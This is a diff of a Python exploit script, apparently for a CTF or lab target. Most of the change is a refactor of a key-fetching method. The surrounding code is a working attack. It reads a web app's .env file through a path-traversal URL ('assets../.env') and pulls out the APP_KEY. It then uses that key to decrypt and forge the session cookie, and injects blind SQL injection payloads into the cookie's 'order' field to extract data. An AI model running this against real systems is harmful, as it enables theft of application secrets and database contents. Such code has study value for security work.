@@ -35,15 +35,14 @@ class Aes:
 class cookie_bsqli:
 	def __init__(self):
 		self.session = requests.session()
-		self.aes = Aes(self.__get_key(self.session))
+		self.aes = Aes(self.__get_key())
 		self.cookie_dict, self.cookie_id = self.__decode_cookie()
 		self.deserialized_data = self.__decrypt_value()
 		self.exfil_data = {}
 
-	@staticmethod
-	def __get_key(session):
-		session.get(BASE_URL)
-		env_data = session.get(BASE_URL+'assets../.env').text
+	def __get_key(self):
+		self.session.get(BASE_URL)
+		env_data = self.session.get(BASE_URL+'assets../.env').text
 		key_pattern = 'APP_KEY=base64:'
 		app_key_start = env_data.find(key_pattern)+len(key_pattern)
 		key_str = env_data[app_key_start:app_key_start+44]
@@ -85,7 +84,7 @@ class cookie_bsqli:
 		"""
 		payload = payload_fstr.format(pos=pos, ch=ch)
 		self.deserialized_data[b'order'] = payload
-		
+
 		"""
 		Next we re-serialized the cookie containing the payload and user and json encode it
 		"""
@@ -175,3 +174,4 @@ def main():
 
 if __name__ == '__main__':
 	main()
+
